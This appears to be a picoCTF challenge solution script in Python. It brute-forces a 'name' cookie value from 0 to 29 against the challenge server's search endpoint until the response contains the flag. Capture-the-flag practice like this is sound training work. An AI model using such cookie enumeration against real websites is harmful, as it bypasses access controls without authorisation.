# Tristan Gomez

import requests

s = requests.Session()

i = 0

exploit_data = {
    'name' : 'snickerdoodle'
}

exploit_cookie = {
    'name' : f'{i}'
}

resp = s.post("http://mercury.picoctf.net:21485/search", cookies=exploit_cookie, data=exploit_data)
if('picoCTF{' in resp.text):
        print(resp.status_code)
        print(resp.text)
else:
    i += 1
    while(i < 30):
        exploit_data = {
            'name' : 'snickerdoodle'
        }

        exploit_cookie = {
            'name' : f'{i}'
        }   

        resp = s.post("http://mercury.picoctf.net:21485/search", cookies=exploit_cookie, data=exploit_data)
        if('picoCTF{' in resp.text):
            print(resp.text)
            break   
        i += 1
